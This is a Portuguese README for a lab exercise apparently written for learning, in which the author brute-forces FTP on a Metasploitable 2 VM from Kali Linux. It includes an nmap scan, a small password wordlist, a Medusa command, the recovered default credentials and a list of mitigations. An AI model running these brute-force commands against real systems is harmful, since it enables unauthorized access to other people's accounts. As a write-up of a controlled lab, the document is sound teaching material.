# 🔐 Laboratório de Segurança - Brute Force com Kali Linux e Medusa

## 🎯 Objetivo

Este projeto tem como objetivo demonstrar, na prática, a execução de ataques de força bruta em um ambiente controlado, utilizando Kali Linux, Medusa e uma máquina vulnerável (Metasploitable 2).

O foco foi compreender como ataques ocorrem e como podem ser identificados e mitigados.

---

## 🧱 Ambiente de Laboratório

* Kali Linux (máquina atacante)
* Metasploitable 2 (máquina vulnerável)
* VirtualBox
* Rede: Host-Only (ambiente isolado)

---

## 🔍 Enumeração

Foi realizado scan com Nmap para identificar serviços ativos:

```bash
nmap -sV 192.168.56.6
```

### Serviços identificados:

* FTP (21)
* SSH (22)
* HTTP (80)
* SMB (445)
* Outros serviços vulneráveis

---

## 💣 Ataque de Força Bruta (FTP)

### Wordlist utilizada:

```text
123456
admin
password
root
msfadmin
```

### Execução:

```bash
medusa -h 192.168.56.6 -u msfadmin -P wordlist.txt -M ftp
```

---

## 🎯 Resultado

Credenciais descobertas:

* Usuário: **msfadmin**
* Senha: **msfadmin**

---

## 🔓 Validação de Acesso

Foi realizada conexão via FTP para validar o acesso:

```bash
ftp 192.168.56.6
```

Resultado:

* Primeira tentativa: falha
* Segunda tentativa: sucesso

---

## 📁 Exploração

Após o acesso:

```bash
ls
pwd
```

Diretório identificado:

```text
/home/msfadmin
```

---

## ⚠️ Vulnerabilidade Identificada

O sistema apresentou vulnerabilidade devido ao uso de:

* Senhas fracas
* Falta de proteção contra brute force
* Ausência de bloqueio após múltiplas tentativas

---

## 🛡️ Medidas de Mitigação

* Implementação de senhas fortes
* Uso de autenticação multifator (MFA)
* Limitação de tentativas de login
* Monitoramento de logs
* Uso de firewall

---

## 🧠 Aprendizados

* Como realizar enumeração com Nmap
* Como executar brute force com Medusa
* Como validar acesso após exploração
* Importância de boas práticas de segurança

---

## 🚀 Melhorias Futuras

* Integração com Graylog para monitoramento de logs
* Criação de alertas para detecção de brute force
* Testes em outros serviços (SMB, HTTP)
* Automação de ataques e análise

---

## ⚠️ Aviso

Este projeto foi desenvolvido exclusivamente para fins educacionais, em ambiente controlado.
